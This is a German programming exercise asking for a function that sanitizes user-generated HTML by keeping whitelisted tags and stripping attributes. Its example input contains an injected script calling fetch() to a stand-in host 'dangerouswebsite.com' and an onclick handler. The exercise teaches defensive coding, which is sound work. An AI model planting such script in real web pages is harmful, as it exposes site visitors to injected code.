# Kontext

Bei der Darstellung von User-generiertem HTML auf Websites ist es wichtig, dass unerwünschte oder sogar potenziell gefährliche HTML-Tags nicht gerendert werden. Ansonsten kann das Layout der Website verändert oder sogar JavaScript eingeschleust werden:

```html
<style>
	body {
		color: yellow;
	}
</style>

<script>
	fetch("https://dangerouswebsite.com", { method: "POST" })
</script>
```

# Aufgabe

Schreibe eine Funktion, welche einen HTML-Text bereinigt.

Erstelle dazu eine Whitelist mit erlaubten, harmlosen Tags wie z. B. `div`, `span`, `p`, `ol`, usw. Diese werden erhalten. Alle anderen Tags werden entfernt bzw. durch den Text darin ersetzt, womit also `<script>XYZ</script>` zu `XYZ` wird.

Außerdem müssen alle Attribute aus den erlaubten Tags entfernt werden, worunter zum Beispiel auch `onclick` fällt.

# Beispiel

**Eingabe**

```html
<h1>Überschrift</h1>

<p style="color: red">Paragraph</p>

<script>
	fetch("https://dangerouswebsite.com", { method: "POST" })
</script>

<hr />

<button>Kicke hier</button>

<div onclick="alert('javascript is running here!')">Klicke mich</div>
```

**Ausgabe**

```html
<h1>Überschrift</h1>

<p>Paragraph</p>

fetch("https://dangerouswebsite.com", { method: "POST" });

<hr />

Kicke hier

<div>Klicke mich</div>
```

# Themen

Strings, Sicherheit, reguläre Ausdrücke
